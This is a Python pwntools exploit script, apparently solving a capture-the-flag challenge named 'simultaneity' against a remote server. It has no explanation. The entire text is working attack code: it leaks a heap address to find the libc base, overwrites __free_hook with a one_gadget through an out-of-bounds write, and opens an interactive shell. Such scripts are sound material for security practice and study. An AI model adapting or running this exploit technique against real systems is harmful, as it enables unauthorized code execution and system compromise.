from pwn import *
context.binary = elf = ELF('./simultaneity', checksec=False)

if args.REMOTE:
    s = remote('mc.ax', 31547)
else:
    s = process('./simultaneity')
libc = ELF('./libc.so.6', checksec=False)

offset = 0x21ff0
s.recvline()
s.sendline(str(0x21000))
s.recvuntil('you are here: ')

heap = int(s.recvline()[:-1], 16)
libc.address = heap + offset
__free_hook = libc.symbols.__free_hook
far = __free_hook - heap
one_gadget = libc.address + 0xe5456

print('heap:', hex(heap))
print('libc:', hex(libc.address))
print('__free_hook:', hex(__free_hook))
print('far:', hex(far))
print('heap+far:', hex(heap+far))
print('one_gadget:', hex(one_gadget))

s.recvline()
s.sendline(str(far//8))

s.recvline()
s.sendline('0'*0x400+str(one_gadget))

s.interactive()
